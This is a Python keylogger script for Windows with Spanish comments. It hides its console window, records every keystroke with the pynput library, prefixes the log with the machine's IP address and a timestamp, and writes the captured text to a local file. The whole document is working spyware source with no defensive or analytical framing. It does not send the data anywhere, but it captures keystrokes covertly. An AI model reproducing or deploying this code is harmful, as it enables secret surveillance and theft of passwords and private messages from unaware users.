#Para esconder la ventana
import win32console
import win32gui
import pynput.keyboard
import socket
from datetime import datetime
#trabajar con palabras

ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)#para acultar la venta

log_file = open('log.txt','w+')
lista_tecla=[] #En esta lista se guardaran las palabras
def imprimir():
    tecla = ''.join(lista_tecla)
    log_file.write(tecla)
    log_file.write("\n")
    log_file.close()
def presiona(key):
    key1 = convertir(key)
    #Key es con la letra k en mayuscula
    if key1 == "Key.esc":
        print("Saliendo...")
        imprimir()
        return False
    #Si es igual al espacio
    elif key1 == "Key.space":
        lista_tecla.append(" ")
    #si le da un enter
    elif key1 == "Key.enter":
        lista_tecla.append("\n")
    #Si borra que no aparesca nada
    elif key1 == "Key.backspace":
        lista_tecla.append(" borro ")
    #Si es igual a una letra
    else:
        lista_tecla.append(key1)

def convertir(key):
    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)
#IP del equipo
lista_tecla.append(socket.gethostbyname(socket.gethostname())+"\n")
#Hora de ejecucion del programa
lista_tecla.append(datetime.now().strftime('%Y-%m-%d %H:%M:%S'+"\n"))
#Lo que obtenemos al teclear
with pynput.keyboard.Listener(on_press=presiona) as liste:
    liste.join()
